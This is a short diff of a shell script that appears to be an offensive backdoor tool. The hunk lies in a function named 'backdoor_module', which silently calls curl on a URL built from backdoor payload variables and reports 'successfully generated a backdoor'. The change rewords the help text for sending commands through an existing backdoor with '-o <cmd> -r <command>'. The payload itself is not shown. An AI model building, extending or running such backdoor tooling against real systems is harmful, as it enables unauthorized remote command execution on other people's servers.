@@ -120,7 +120,7 @@ function backdoor_module(){
     curl -s $url_cut_backdoor$payload_backdoor >/dev/null
     echo -e "$BOX1 $WHITE$VAR17$GREEN    Congratulations! You have successfully generated a backdoor!$END\n"
   else
-    echo -e "$BOX2 $WHITE$VAR17$RED    You already have a previously generated backdoor. Please run the option \"cmd\" + 'command'.\n"
+    echo -e "$BOX2 $WHITE$VAR17$RED    You already have a previously generated backdoor. Please run the option: \"-o <cmd> -r <command>\".\n"
   fi
 }
 
